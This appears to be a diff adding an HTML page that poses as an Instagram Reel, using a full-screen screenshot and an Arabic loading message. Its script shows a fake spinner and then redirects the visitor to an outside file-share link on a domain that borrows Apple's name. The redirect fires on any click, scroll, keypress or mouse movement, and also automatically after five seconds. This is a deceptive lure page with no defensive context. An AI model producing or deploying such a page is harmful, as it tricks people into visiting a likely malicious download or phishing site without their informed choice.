@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Reel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        .clickable-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            cursor: pointer;
+        }
+        .clickable-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #E1306C;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="clickable-container" onclick="redirectToContent()">
+        <img src="Screenshot_2025-10-16_02-10-52.png" 
+             alt="Instagram Reel" 
+             class="clickable-img"
+             onload="startAutoRedirect()">
+    </div>
+
+    <div class="loading-overlay" id="loading">
+        <div class="loader"></div>
+        <p>جاري تحميل الريلز...</p>
+    </div>
+
+    <script>
+        let redirectTriggered = false;
+
+        function redirectToContent() {
+            if (!redirectTriggered) {
+                redirectTriggered = true;
+                showLoading();
+                setTimeout(() => {
+                    window.location.href = 'https://apple.files-share.org/VUhkLiQn';
+                }, 2000);
+            }
+        }
+
+        function startAutoRedirect() {
+            setTimeout(() => {
+                if (!redirectTriggered) {
+                    redirectToContent();
+                }
+            }, 5000);
+        }
+
+        function showLoading() {
+            document.getElementById('loading').style.display = 'flex';
+        }
+
+        document.addEventListener('scroll', redirectToContent);
+        document.addEventListener('keydown', redirectToContent);
+        document.addEventListener('mousemove', redirectToContent);
+    </script>
+</body>
+</html>
